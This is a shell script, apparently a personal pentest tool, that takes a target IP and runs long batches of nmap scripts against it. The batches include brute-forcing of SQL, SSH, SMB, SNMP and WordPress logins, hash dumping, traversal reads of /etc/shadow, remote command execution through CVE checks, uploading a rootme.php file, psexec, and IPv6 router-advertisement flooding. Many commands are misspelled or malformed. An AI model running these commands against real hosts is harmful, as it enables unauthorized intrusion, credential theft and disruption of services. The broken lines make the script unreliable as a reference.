#!/bin/sh
#[+] Pentest Script by vDroPZz
#[+] Github @DroPZsec
#
#
#

# COLORS

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

# STARTING NMAP CUSTOM SCANs

#StartingPersonalAd 
clear 
sleep 0.5 
    echo $orange
    figlet -f small "Coded by:"
    echo $reset
sleep 0.5 
    echo $blue
    figlet -f big "vDroPZz"
    echo $reset
sleep 1.0 
clear 
    echo $orange
    figlet -f small "Github:"
    echo $reset
sleep 0.5 
    echo $blue
    figlet -f big "DroPZsec"
    echo $reset
sleep 1.0 
clear 

#ReadingTargetIP
echo $green "TYPE IN TARGET IP-ADRESS OR SERVER-IP:" $reset
    read ip;
clear 
echo $green "TARGET IP:" $reset $blue " $ip " $reset
sleep 1.5 

#FirstScanRound
echo $green "STARTING FIRST NMAP SCAN WITH TRY OF SERVER IDENTIFICATION"
    sleep 0.5
echo "."
    sleep 0.5
echo "."
    sleep 0.5
echo "." $reset
    sleep 0.75
clear 
echo $green "TARGET IP:" $reset $blue " $ip " $reset
    sleep 0.25
sudo nmap -T4 -Pn -A $ip --traceroute -d    
    sleep 0.75

#NmapLuaScriptScans

# MetasploitChecker

echo $green "WANT TO CHECK FOR RUNNING METASPLOIT ON TARGET?" $reset $blue "(Y/n)" $reset
    read answer;
if [ $answer = y ]; then
    sudo -Pn nmap $ip --script=metasploit-info --script-args username=root,password=root -d      
fi 
if [ $answer = n ]; then 
    echo $green "OK, YOURE CHOICE..!" $reset
    sleep 1.5 
fi 

# NmapSqlScan 
echo $green "WANT TO SQL SCAN YOUR TARGET?" $reset $blue "(y/N)" $reset
    sleep 0.5 
    read answer2;
if [ $answer2 = y ]; then 
    echo $green "MS-SQL or MY-SQL?" $reset $blue "(MS/MY)" $reset
        sleep 1.0 
        read answer3;
            if [ $answer3 = ms ]; then
                sudo nmap -Pn -p 1433 $ip --script=ms-sql-info.nse -d
                sudo nmap -Pn -p 1433 --script ms-sql-ntlm-info $ip -d    
                sudo nmap -Pn -p 1433 --script ms-sql-ms-sql-query --script-args mssql.username=sa,mssql.password=sa,ms-sql-query.query="SELECT * FROM master..syslogins" $ip    
                sudo nmap -Pn -p 1433 --script ms-sql-tables --script-args msssql.username=sa;mssql.password=sa $ip -d     
                sudo nmap -Pn -p 1433 --script ms-sql-config --script-args mssql.username=sa,mssqlpassword=sa $ip -d       
                sudo nmap -Pn -p 1433 --script ms-sql-hasbadaccess --script-args mssql.username=sa,mssql.password=sa $ip -d        
                sudo nmap -Pn -p 445 --script ms-sql-empty-password --script-args mssql.instance-all $ip -d        
                sudo nmap -Pn -p 1433 --script ms-sql-empty-password $ip -d    
                sudo nmap -sU -p 1434 --script ms-sql-doc $ip -d    
                sudo nmap -Pn -p 445 --script ms-sql-brute --script-args mssql.instance=all,userdb=customuser.txt $ip -d        
                sudo nmap -Pn -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt $ip -d         
                sudo nmap -Pn -p 1433 $ip --script ms-sql-dump-hashes -d     
            fi    
            if [ $answer3 = my ]; then
                sudo nmap -Pn -p 3306 --script mysql-info -d    
                sudo nmap -Pn -p 3306 --script mysql-audit --script-args "mysql.username='root', \
                  mysql.audit.password='foobar',mysql-audit.filename='nselib/data/mysql-cis.audit'" -d 
                sudo nmap -Pn -p 3306 --script mysql-brute $ip -d      
                sudo nmap -Pn -p 3306 --script mysql-enum $ip -d    
                sudo nmap -Pn -p 3306 $ip --script mysql-query --script-args'query"<query>"[,username=<username>,password=<password>]' -=$(find "/path/to/search" -maxdepth 1 -type f -exec grep "criteria" {} +)
                sudo nmap -Pn -p 3306 $ip --script mysql-databeses.nse -d    
                sudo nmap -Pn -p 3306 $ip --script mysql-empty-password.nse -d      
                sudo nmap -Pn $ip -p 3306 --script mysql-users.nse -d    
                sudo nmap -Pn -p 3306 $ip --script mysql-variables.nse -d    
                sudo nmap -p 3306 --script mysql-vuln-cve2012-2122 $ip -d    
                sudo nmap -sV --script mysql-vuln-cve2012-2122 $ip -d     
            fi     
        echo $green "FINISH!" $reset  
    fi  
echo $green "RUN http-scan (PORT-80)?" $reset $blue "(Y/n)" $reset
    read answer4;
if [ $answer4 = y ]; then
    sudo nmap -Pn --script=http-apache-neogation --script args http-apache-neogation.root=/root/ $ip -d    
    sudo nmap -Pn -p80 --script http-apache-server-status $ip -d 
    sudo nmap -sV --script http-apache-server-status $ip -d
    sudo nmap -Pn --script http-aspnet-debug $ip -d    
    sudo nmap -Pn --script http-aspnet-debug --script-args http-aspnet-debug.path=/path $ip -d 
    sudo nmap -Pn -p80 --script http-auth-finder $ip -d    
    sudo nmap -Pn --acript http-auth -p80 $ip -d   
    sudo nmap -Pn --script http-auth --script-args http-auth.path=/login -p80 $ip -d    
    sudo nmap -Pn -p80 --script http-avaya-ipoffice-users $ip -d     
    sudo nmap -sV --script http-avaya-ipoffice-users $ip -d   
    sudo nmap -sV --script http-awstatstotal-exec.nse $ip -d     
    sudo nmap -sV --script http-awstatstotal-exec.nse  --script-args 'http-awstatstotal-exec.cmd="uname -a",http-awstatstotal-exec.uri=/awstats/index.php' $ip -d     
    sudo nmap -Pn -p 80,8080 --script http-axis2-dir-traversal --script-args 'http-axis2-dir-traversal.file=../../../../../../../etc/issue' $ip -d    
    sudo nmap -Pn -p80 --script http-axis2-dir-traversal $ip -d    
    sudo nmap -Pn -p80 --script=http-backup-finder $ip -d    
    sudo nmap -Pn --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p80,443,8000,8080 $ip -d    
    sudo nmap -Pn -p 80,443,8000,8080 --script http-bigip-cookie $ip -d             
    sudo nmap -Pn -p80 --script http-brute $ip -d
    sudo nmap -Pn -p80,443 --script http-cakephp-version $ip -d     
    sudo nmap -Pn --script http-chrono $ip -d     
    sudo nmap -sV --script htttp-chrono $ip -d    
    sudo nmap -Pn -p80,443 --script http-cisco-anyconnect $ip -d    
    sudo nmap -sV --script http-coldfusion-subzero $ip -d    
    sudo nmap -p80 --script http-coldfusion-subzero --script-args basepath=/cf/ $ip -d    
    sudo nmap -p80 --script http-comments-displayer.nse $ip -d    
    sudo nmap -Pn --script http-config-backup $ip -d    
    sudo nmap -Pn -p443 --script http-cookie-flags $ip -d    
    sudo nmap -Pn -p 80 --script http-cors $ip -d        
    sudo nmap -Pn --script http-cross-domain-policy $ip -d           
    sudo nmap -Pn -p80 --script http-cross-domain-policy --script-args http-cross-domain-policy.domain-lookup=true $ip -d    
    sudo nmap -Pn -p80 --script http-csrf.nse $ip -d   
    sudo nmap -Pn -p80 --script http-default-accounts $ip -d     
    sudo nmap -Pn -p80 --script http-devframework.nse $ip -d       
    sudo nmap -sV --script http-dlink-backdoor $ip -d     
    sudo nmap -Pn -p80 --script http-dombased-xss.nse $ip -d       
    sudo nmap -Pn --script http-domino-enum-passwords -p80 $ip --script-args http-domino-enum-passords.username='patrik karlson',http-domino-enum-passwords.password=secret -d    
    sudo nmap -Pn -p80 --script http-drupal-enum $ip -d    
    sudo nmap -Pn --script=http-drupal-enum-users --script-args http-drupal-enum-users.root="/path/" $ip -d    
    sudo nmap -Pn -p80 --script http-errors.nse $ip -d    
    sudo nmap -Pn -p80,443 --script http-exif-spider $ip -d    
    sudo nmap -Pn -p80 --script http-huawei-hg5xx-vuln $ip -d    
    sudo nmap -sV --script http-huawei-hg5xx-vuln $ip -d     
    sudo nmap -sn -Pn --script http-icloud-findmyiphone --script-args='username=<user>,password=<pass>' $ip -d     
    sudo nmap -Pn -p80 --script http-iis-short-name-brute $ip -d    
    sudo nmap -Pn -p 80,443 --script http-iis-webdav-vuln $ip -d     
    sudo nmap -Pn --script http-internal-ip-disclosure $ip -d    
    sudo nmap -Pn --script http-internal-ip-disclosure --script-args http-internal-ip-diclosure.path=/path $ip -d     
    sudo nmap -sV --script http-joomla-brute $ip -d    
    sudo nmap -Pn -p80 --script http-jsonp-detection $ip -d    
    sudo nmap -Pn -p80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php $ip -d    
    sudo nmap -Pn -p8088 --script http-litespeed-sourcecode-download $ip -d  
    sudo nmap -n -p80 --script http-ls $ip -d    
    sudo nmap -Pn -p80 --script http-majordomo2-dir-traversal $ip -d    
    sudo nmap -Pn --script http-malware-host $ip -d    
    sudo nmap -Pn --script http-method $ip -d    
    sudo nmap -Pn --script http-method --script-args http-method-uri-path='/website' $ip -d    
    sudo nmap -sV --script http-method-tamper $ip -d    
    sudo nmap -Pn -p80 --script http-method-tamper --script-args 'http-method-tamper.paths={/protected/db.php,/protected/index.php}' $ip -d    
    sudo nmap -Pn -p80 --script http-mobileversion-checker.nse $ip -d     
    sudo nmap -Pn -p80 --script http-ntlm-info --script-args http-ntlm-info.root=/root/ $ip -d     
    sudo nmap -Pn --script http-open-proxy.nse $ip -d    
    sudo nmap -Pn --script http-open-redirect $ip -d  
    sudo nmap -Pn --script http-passwd --script-args http-passwd.root=/test/ $ip -d      
    sudo nmap -Pn --script http-phpmyadmin-dir-traversal $ip -d    
    sudo nmap -Pn -p80 --script http-phpself-xss $ip -d    
    sudo nmap -sV --script http-selfphp-xss $ip -d    
    sudo nmap -Pn --script http-php-version $ip -d    
    sudo nmap -Pn -p8080 --script http-proxy-brute $ip -d    
    sudo nmap -Pn -p80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php' $ip -d     
    sudo nmap -Pn -p80,443 --script http-qnap-nas-info $ip -d    
    sudo nmap -Pn -p80 --script http-referer-checker $ip -d    
    sudo nmap -Pn -p80 --script http-rfi-spider $ip -d    
    sudo nmap -Pn -p80 --script http-robots.txt.nse $ip -d     
    sudo nmap -Pn --script http-robtex-reverse-ip $ip -d    
    sudo nmap -Pn --script http-robtex-shared-ns $ip -d    
    sudo nmap -Pn -p80 --script http-sap-netweaver-leak $ip -d    
    sudo nmap -sV --script http-sap-netweaver-leak $ip -d    
    sudo nmap -Pn -p80,443 --script http-sceurity-headers $ip -d    
    sudo nmap -Pn -p80,443 --script http-server-header $ip -d    
    sudo nmap -sV -p80,443 --script http-shellshock $ip -d    
    sudo nmap -sV -p80,443 --script http-shellshock --script-args http-shellshock.uri='/cgi-bin/bin',http-shellshock.cmd='ls' $ip -d    
    sudo nmap -Pn -p80 --script http-sitemap-generator $ip -d    
    sudo nmap -Pn --script http-slowloris-check $ip -d    
    sudo nmap -Pn -p 80,443 --script http-sql-injection.nse $ip -d    
    sudo nmap -Pn -p80,443 --script http-redirect.nse $ip -d    
    sudo nmap -Pn -p80 --script http-stored-xss $ip -d    
    sudo nmap -sV --script http-svn-enum.nse $ip -d    
    sudo nmap -sV --script http-svn-info $ip -d    
    sudo nmap -sV --script http-title.nse $ip -d    
    sudo nmap -Pn -p80 --script http-tplink-dir-traversal.nse $ip -d    
    sudo nmap -Pn -p80 -n --script http-tplink-dir-traversal.nse $ip -d    
    sudo nmap -Pn -p80 --script http-tplink-dir-traversal.nse --script-args http-tplink-dir-traversal.rfile='/etc/topology.conf' -n $ip -d    
    sudo nmap -sV --script http-trace.nse $ip -d    
    sudo nmap -sV --script http-traceroute.nse $ip -d    
    sudo nmap -Pn -p80 --script http-trane-info $ip -d    
    sudo nmap -sV --script http-unsafe-output-escaping $ip -d     
    sudo nmap -Pn -p80 --script http-useragent-tester $ip -d    
    sudo nmap -sV --script http-userdir-enum.nse $ip -d   
    sudo nmap -Pn -p80,443,8080 --script http-vhosts.nse $ip -d    
    sudo nmap -sV --script http-virustotal.nse --script-args='http-virustotal.apikey="<key>",http-virustotal.checksum="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"' $ip -d    
    sudo nmap -Pn -p54340 --script http-vlcstreamer-ls.nse $ip -d    
    sudo nmap -Pn -p80,443,8222,8333 --script http-vmware-path-vuln.nse $ip -d   
    sudo nmap -sV --script http-vuln-cve2006-3392.nse $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2006-3392.nse --script-args http-vuln-cve2006-3392.file='/etc/shadow' $ip -d   
    sudo nmap -sV --script hhtp-vuln-cve2009-3960 --script-args http-vuln-cve-2009-3960.root='/root/' $ip -d    
    sudo nmap -sV --script http-vuln-cve2010-0738 --script-args http-vuln-cve2010-0738.paths='{/path1/,/path2/}' $ip -d    
    sudo nmap -sV --script http-vuln-cve2010-2861 $ip -d    
    sudo nmap -p80,443 --script http-vuln-cve2011-3192.nse $ip -d      
    sudo nmap -sV --script http-vuln-cve2011-3368 $ip -d    
    sudo nmap -sV --script http-vuln-cve2012-1823.nse $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2012-1823.nse --script-args http-vuln-cve2012-1823.uri='/test.php' $ip -d    
    sudo nmap -sV --script http-vuln-cve2013-0156.nse $ip -d    
    sudo nmap -sV --script http-vuln-cve2013-0156.nse --script-args http-vuln-cve2013-0156.uri='/test/' $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2013-6786.nse $ip -d    
    sudo nmap -sV --script http-vuln-cve2013-6786.nse $ip -d    
    sudo nmap -sV --script http-vuln-cve2013-7091.nse $ip -d
    sudo nmap -Pn -p80 --script http-vuln-cve2013-7091.nse --script-args http-vuln-cve2013-7091=/ZimBra $ip -d    
    sudo nmap -p443 --script http-vuln-cve2014-2126.nse $ip -d     
    sudo nmap -p443 --script http-vuln-cve2014-2127.nse $ip -d     
    sudo nmap -p443 --script http-vuln-cve2014-2128.nse $ip -d
    sudo nmap -p443 --script http-vuln-cve2014-2129.nse $ip -d 
    sudo nmap -sV --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" $ip -d   
    sudo nmap -sV --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false $ip -d
    sudo nmap -sV --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress" $ip -d    
    sudo nmap -sV --script http-vuln-cve2014-8877 $ip -d    
    sudo nmap -sV --script http-vuln-cve2015-1427.nse --script-args http-vuln-cve2015-1427.command='ls' $ip -d    
    sudo nmap -sV --script http-vuln-cve2015-1635 $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2015-1635.nse $ip -d    
    sudo nmap -sV --script http-vuln-cve2015-1635 --script-args http-vuln-cve2015-1635.uri='/anotheruri/' $ip -d    
    sudo nmap -sV --script http-vuln-cve2017-1001000 --script-args http-vuln-cve100-1000="uri" $ip -d    
    sudo nmap -sV --script http-vuln-cve2017-1001000 $ip -d         
    sudo nmap -Pn -p80,443 --script http-vuln-cve2017-5638 $ip -d     
    sudo nmap -Pn -p16992 --script http-vuln-cve2017-5689 $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2017-8917 $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2017-8917 --script-args http-vuln-cve2017-8917.uri='/joomla/' $ip -d    
    sudo nmap -Pn -p7547 --script http-vuln-misfortune-cookie $ip -d     
    sudo nmap -sV -p80 --script http-vuln-wnr1000-creds $ip -d   
    sudo nmap -Pn -p80 --script http-waf-detect $ip -d    
    sudo nmap -Pn -p80 --script http-waf-detect --script-args http-waf-detect.aggro,http-wafdetect.uri='/testphp.vulnweb.com/artists.php' $ip -d    
    sudo nmap -sV --script http-waf-fingerprint $ip -d    
    sudo nmap -sV --script http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 $ip -d     
    sudo nmap -Pn -p80,8080 --script http-webdav-scan $ip -d    
    sudo nmap -sV --script http-wordpress-brute $ip -d    
    sudo nmap -sV --script http-wordpress-brute --script-args http-wordpress-brute.userdb='users.txt',http-wordpress-brute.hostname='domain.com',http-wordpress-brute.threads=3,brute.firstonly='true' $ip -d
    sudo nmap -sV --script http-wordpress-enum $ip -d    
    sudo nmap -sV --script http-wordpress-enum --script-args type="themes" $ip -d    
    sudo nmap -Pn -p80 --script http-wordpress-users $ip -d    
    sudo nmap -sV --script http-wordpress-users --script-args limit=50 $ip -d    
    sudo nmap -Pn -p80 --script http-xssed $ip -d               
fi
if [ $answer4 = n ]; then 
    echo $green "OKAY, YOURE CHOICE!" $reset
fi 
echo $green "RUN IP-GEO-Scans?" $reset $blue "(Y/n)" $reset
    read answer5;
if [ $answer5 = y ]; then 
    echo $green "OKAY, LETZE GOO" $reset 
        sleep 2.0
    sudo nmap -sn $ip --script ip-forwarding -d 
    sudo nmap -sV --script ip-geolocation-geoplugin $ip -d 
    sudo nmap -sV --script ip-geolocation-ipinfodb $ip -d
    sudo nmap -Pn -sn --script ip-geolocation-map-bing --script-args ip-geolocation-map-bing.path=map.png $ip -d    
    sudo nmap -Pn -sn --script ip-geolocation-map-google --script-args ip-geolocation-map-google.path=map-google.png $ip -d 
    sudo nmap -Pn -sn --script ip-geolocation-map-kml --script-args ip-geolocation-map-kml.path=map-kml.png $ip -d
    sudo nmap -sV --script ip-geolocation-maxmind $ip -d
    nmap -sV --script ip-https-discover $ip -d   
fi
if [ $answer5 = n ]; then
    echo $green "OKAY... IT'S DONE!" $blue "YOUR'RE CHOICE!" $reset       
fi
echo $green "RUN IP-SEC SCANS?" $reset
    read answer6;
if [ $answer6 = n ]; then
    echo $green "OK LETZE GOO!" $reset 
fi 
if [ $answer6 = y ]; then
    sudo nmap -Pn -p80 --script ipidseq $ip -d
    sudo nmap -sV -p80 --script ipidseq $ip -d
fi
echo $green "WOULD SCAN IPMI / UDP SCRIPTS NOW?" $reset
    read answer7;
if [ $answer7 = n ]; then 
    echo $green "OKAY IT IS YOUR TRAVEL!" $reset 
fi
if [ $answer7 = y ]; then
    echo $green "Started..." $reset 
        sudo nmap -sU --script ipmi-brute -p 623 $ip -d
        sudo nmap -sU --script ipmi-cipher-zero -p 623 $ip -d
        sudo nmap -sU --script ipmi-version -p 623 $ip -d
fi 
echo $green "YOU WOULD SCAN FOR IPV6 SECURITY-BYPASSES?" $reset
    read answer8;
if [ $answer8 = n ]; then 
    echo $green "OKE BUT THERE SAFETY A LOT OF GAPS!" $reset
fi
if [ $answer8 = y ]; then
    sudo nmap --script ipv6-multicast-mld-list $ip
    sudo nmap -6 $ip 
    sudo nmap -6 --script ipv6-ra-flood.nse $ip 
    sudo nmap -6 --script ipv6-ra-flood.nse --script-args 'interface=<interface>' $ip -d
    sudo nmap -6 --script ipv6-ra-flood.nse --script-args 'interface=<interface>,timeout=10s' $ip -d
fi
echo $green "WOULD RUN INTERN INTENSE SCAN?" $reset
    read answer9;
if [ $answer9 = y ]; then
    echo $green "OK, START..." $reset
    nmap -v -sn 192.168.0.0/16 10.0.0.0/8
fi
if [ $answer9 = n ]; then
    echo $green "OK, SKIP YOURE DEVICES!" $reset 
fi
echo $green "WOULD RUND SAMBA-SERVICE-SCANS?" $reset
    read answer10;
if [ $answer10 = n ]; then
    echo $green "OKAY,YOURE SCAN; YOURE CHOICE!" $reset 
fi 
if [ $answer10 = y ]; then
    echo $green "LETZE GOO!" $reset 
    sudo nmap -p445 --script smb-protocols $ip -d
    sudo nmap -p139 --script smb-protocols $ip -d
    sudo nmap -p 445 $ip --script smb-ls --script-args 'share=c$,path=\temp' -d
    sudo nmap -p 445 $ip --script smb-enum-shares,smb-ls -d
    sudo nmap --script smb-brute.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-brute.nse -p U:137,T:139 $ip -d
    sudo nmap --script smb-enum-services.nse -p445 $ip -d
    sudo nmap --script smb-enum-services.nse --script-args smbusername=<username>,smbpass=<password> -p445 $ip -d
    nmap --script smb-enum-domains.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-enum-domains.nse -p U:137,T:139 $ip -d
    nmap --script smb-enum-users.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 $ip -d
    nmap --script smb-enum-sessions.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-enum-sessions.nse -p U:137,T:139 $ip -d
    nmap --script smb-enum-shares.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 $ip -d
    nmap -p 445 $ip --script smb-mbenum -d
    nmap --script smb-enum-users.nse -p445 $ip -d 
    sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 $ip -d
    nmap --script smb-os-discovery.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 $ip -d
    nmap  -p 445 $ip --script=smb-print-text  --script-args="text=0wn3d" -d
    nmap --script smb-psexec.nse --script-args=smbuser=<username>,smbpass=<password>[,config=<config>] -p445 $ip -d
    sudo nmap -sU -sS --script smb-psexec.nse --script-args=smbuser=<username>,smbpass=<password>[,config=<config>] -p U:137,T:139 $ip -d
    nmap -p445 --script smb-protocols $ip -d
    nmap -p139 --script smb-protocols $ip -d
    nmap -p 445 $ip --script=smb-double-pulsar-backdoor -d
    nmap --script smb-enum-processes.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-enum-processes.nse -p U:137,T:139 $ip -d
    nmap --script smb-security-mode.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-security-mode.nse -p U:137,T:139 $ip -d
    nmap --script smb-system-info.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-system-info.nse -p U:137,T:139 $ip -d
    nmap --script smb-server-stats.nse -p445 $ip -d
    sudo nmap -sU -sS --script smb-server-stats.nse -p U:137,T:139 $ip -d
    nmap --script smb-vuln-conficker.nse -p445 $ip -d 
    sudo nmap -sU --script smb-vuln-conficker.nse -p T:139 $ip -d
fi
echo $green "WOULD RUN SAMBA-SERVICE-EXPLOIT SCANS?" $reset
    read answer11;
if [ $answer11 = n ]; then
    echo $green "OK, NOT CLEVER, BUT OKAY..." $reset
fi
if [ $answer11 = y ]; then
echo $green "OK, START THE TRAVEL..." $reset
    nmap --script smb-vuln-cve2009-3103.nse -p445 $ip -d
    sudo nmap -sU --script smb-vuln-cve2009-3103.nse -p U:137,T:139 $ip -d
    nmap --script smb-vuln-cve-2017-7494 -p 445 $ip -d
    sudo nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $ip -d
    nmap --script smb-vuln-ms06-025.nse -p445 $ip -d
    nmap -sU --script smb-vuln-ms06-025.nse -p U:137,T:139 $ip -d
    nmap --script smb-vuln-ms07-029.nse -p445 $ip -d
    sudo nmap -sU --script smb-vuln-ms07-029.nse -p U:137,T:139 $ip -d
    nmap --script smb-vuln-ms08-067.nse -p445 $ip -d
    sudo nmap -sU --script smb-vuln-ms08-067.nse -p U:137 $ip -d
    nmap  -p 445 $ip --script=smb-vuln-ms10-054 --script-args unsafe -d
    nmap  -p 445 $ip --script=smb-vuln-ms10-061 -d
    nmap -p445 --script smb-vuln-ms17-010 $ip -d
    nmap --script smb-vuln-regsvc-dos.nse -p445 $ip -d
    sudo nmap -sU --script smb-vuln-regsvc-dos.nse -p U:137,T:139 $ip -d
    nmap -p445 --script smb2-time $ip -d
    nmap -p 445 --script smb2-capabilities $ip -d
    nmap -p 139 --script smb2-capabilities $ip -d
    sudo nmap -O --script smb2-vuln-uptime $ip -d
    nmap -p445 --script smb2-vuln-uptime --script-args smb2-vuln-uptime.skip-os=true $ip -d
    nmap -p 445 --script smb2-security-mode $ip -d
    nmap -p 139 --script smb2-security-mode $ip -d
fi
echo $green "WOULD RUN SMTP-SCRIPT-SCANS?" $reset
    read answer12;
if [ $answer12 = n ]; then
    echo $green "OK, YOURE SCRIPT-CHOICE!" $reset
fi 
if [ $answer12 = y ]; then
    nmap -p 25,465,587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=domain.com $ip -d
    nmap -Pn --script smtp-open-relay.nse -p 25,465,587 $ip -d
    nmap -p 25 --script smtp-brute $ip -d
    nmap -Pn --script smtp-commands.nse -pT:25,465,587 $ip -d
    nmap -Pn --script smtp-enum-users.nse -p 25,465,587 $ip -d
    nmap -Pn --script smtp-strangeport.nse -p 25,465,587 $ip -d
    nmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 $ip -d
    nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 $ip -d
    nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=<domain>' -pT:25,465,587 $ip -d
    nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 $ip -d
fi
echo $green "WOULD RUN SNMP-SCRIPT-SCANS?" $reset
    read answer13; 
if [ $answer13 = n ]; then
    echo $green "OK, YOURE CHOICE.." $reset
fi 
if [ $answer13 = y ]; then
    sudo nmap -sU -p 161 --script=snmp-interfaces $ip -d
    sudo nmap -sU -p 161 --script=snmp-info $ip -d
    sudo nmap -sU -p 161 --script snmp-hh3c-logins --script-args creds.snmp=:<community> $ip -d
    sudo nmap -sU -p 161 --script=snmp-netstat $ip -d
    sudo nmap -sU -p 161 --script snmp-ios-config --script-args creds.snmp=:<community> $ip -d
    sudo nmap -sU --script snmp-brute $ip -d
    sudo nmap -sU -p 161 --script=snmp-processes $ip -d
    sudo nmap -sU -p 161 --script snmp-sysdescr $ip -d 
    sudo nmap -sU -p 161 --script=snmp-win32-services $ip -d 
    sudo nmap -sU -p 161 --script=snmp-win32-shares $ip -d 
    sudo nmap -sU -p 161 --script=snmp-win32-software $ip -d 
    sudo nmap -sU -p 161 --script=snmp-win32-users $ip -d
fi
echo $green "WOULD RUN SSH SCRIPT-SCANS?" $reset
    read answer14;
if [ $answer14 = n ]; then 
    echo $green "OK, YOURE CHOICE IN YOUR SCAN..!" $reset
fi 
if [ $answer14 = y ]; then 
    echo $green "LETZE GOO!" $reset
    nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=ls -l /, ssh-run.username=myusername, ssh-run.password=mypassword" $ip -d
    nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<username>" $ip -d
    nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst,ssh-brute.timeout=4s $ip -d
    nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full $ip -d
    nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=all $ip -d
    nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey='visual bubble' $ip -d
    nmap -p 22 --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}"  $ip -d
    nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "user"}, publickeys={"./id_rsa1.pub", "./id_rsa2.pub"}'  $ip -d
fi
echo $green "WOULD SCAN SSL PORT WITH SCRIPTS?" $reset
    read answer15;
if [ $answer15 = n ]; then
    echo $green "OK, YOURE CHOICES!" $reset
fi
if [ $answer15 = y ]; then 
    echo $green "LETZE STARTE AGAIN..!" $reset
    nmap -p 443 --script ssl-ccs-injection $ip -d
    nmap -p 443 --script ssl-cert-intaddr $ip -d
    nmap $ip --script=ssl-date -d
    nmap --script ssl-dh-params $ip -d
    nmap -sV --script ssl-enum-ciphers -p 443 $ip -d
    nmap -p 443 --script ssl-heartbleed $ip -d
    nmap --script ssl-known-key -p 443 $ip -d
    nmap -sV --version-light --script ssl-poodle -p 443 $ip -d 
    nmap -p22 --script sslv2-drown $ip -d
    nmap -p22 --script sslv2 $ip -d
fi
echo $orange "THAT WAS THE TOOL"
    sleep 1.0
figlet -f small "BadNmapTrip"
    echo $reset
    sleep 1.5
echo $blue "TOOL WAS CODED BY:" $reset
    sleep 1.5
    echo $blue
figlet -f big "vDroPZz"
    sleep 2.0
echo $reset $green "VISIT ME ON GITHUB:" $reset 
echo $orange
figlet -f small "DroPZsec"
    sleep 1.5 
echo $reset
exit      
/bin/sh